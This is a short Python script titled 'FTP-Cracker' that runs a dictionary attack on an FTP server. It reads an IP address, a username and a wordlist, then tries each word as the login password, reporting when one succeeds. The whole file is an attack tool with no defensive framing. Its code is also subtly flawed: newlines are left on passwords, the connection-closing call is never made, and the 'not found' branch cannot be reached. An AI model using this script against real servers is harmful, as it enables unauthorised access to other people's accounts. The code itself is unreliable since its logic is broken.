#! /usr/bin/python

import ftplib

print('''
 _____  _____  ____          ____                    _
|  ___||_   _||  _ \        / ___| _ __  __ _   ___ | | __  ___  _ __
| |_     | |  | |_) |_____ | |    | '__|/ _` | / __|| |/ / / _ \| '__|
|  _|    | |  |  __/|_____|| |___ | |  | (_| || (__ |   < |  __/| |
|_|      |_|  |_|           \____||_|   \__,_| \___||_|\_| \___||_|

''')

# Take user input as to IP address of the FTP server
server = input("What is the IP Address of the FTP server: ")
print("use => " +server)

# Take user input on the username to attempt to crack
username = input("What is the username are you trying to crack: ")
print("use => " +username)

# Take user input as to the location and filename of the password list
passwordlist = input("Select the path of your password list: ")
print("use => " +passwordlist)

# use this try/except to attempt to connect to the ftp server
try:

    with open(passwordlist, 'r') as pw:

        for word in pw:
            if word is not None:
                word=word.strip('\r')

                try:
                    ftp=ftplib.FTP(server)
                    ftp.login(username,word)
                    print ('Success! The password is ' +word)
                    ftp.quit

                except:
                    print("Still trying...")

            else:
                print("Password not found!")

except:
    print("Please check the path of wordlist. Either the file does not exist or the wrong path")

